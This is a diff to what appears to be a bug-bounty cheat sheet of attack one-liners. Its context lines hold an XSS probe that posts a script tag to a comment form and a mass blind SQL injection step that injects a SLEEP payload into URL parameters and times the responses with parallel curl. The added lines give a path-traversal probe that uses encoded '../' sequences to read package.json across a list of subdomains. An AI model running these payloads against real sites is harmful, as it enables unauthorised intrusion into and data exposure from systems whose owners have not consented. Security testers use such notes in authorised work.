@@ -200,6 +200,10 @@ cat urls.txt | xargs -I % sh -c 'python3 paramspider.py -d %'
 curl -d '<script>alert("XSS")</script>' 'https://target.com/comment.php'
 This one-liner sends a POST request with a script tag as the comment parameter. The script tag will be reflected in the response if HTML injection is possible, indicating a potential vulnerability for cross-site scripting (XSS) attacks.
 
+
 blind sql inmass
 cat param.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)"> blindsql.txt
 cat blindsql.txt|parallel -j50 -q curl -o /dev/null -s -w %{time_total}\\n
+
+ghost path traversal
+httpx -l subs.txt -path "/assets/built%2F..%2F..%2F/package.json" -status-code -mc 200"
